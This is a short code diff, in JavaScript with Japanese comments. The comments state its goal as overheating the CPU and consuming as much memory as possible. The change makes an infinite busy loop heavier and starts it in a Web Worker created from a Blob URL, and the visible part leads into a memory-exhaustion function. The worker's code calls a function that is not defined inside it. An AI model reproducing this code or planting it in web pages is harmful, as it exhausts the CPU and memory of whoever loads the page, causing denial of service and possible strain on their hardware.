@@ -3,13 +3,16 @@
 // 1. CPUを極限まで使用し過熱させる
 function overheatCPU() {
     while(true) {
-        // 無限ループでCPUをフル稼働
+        // より重い計算をする無限ループ
         let now = Date.now();
         while(Date.now() - now < 1) {
-            Math.random() * Math.random() * Math.random();
+            for(let i = 0; i < 1000000; i++) {
+                Math.sqrt(i) * Math.random();
+            }
         }
     }
 }
+
 // Web WorkerでCPU過熱を別スレッドで実行
 let cpuWorker = new Worker(URL.createObjectURL(new Blob([`
     onmessage = function() {
@@ -17,8 +20,8 @@ let cpuWorker = new Worker(URL.createObjectURL(new Blob([`
         overheatCPU();
     }
 `], {type: 'application/javascript'})));
-cpuWorker.postMessage('start');
 
+cpuWorker.postMessage('start');
 // 2. メモリを最大限に消費
 function consumeMemory() {
     let memory = [];
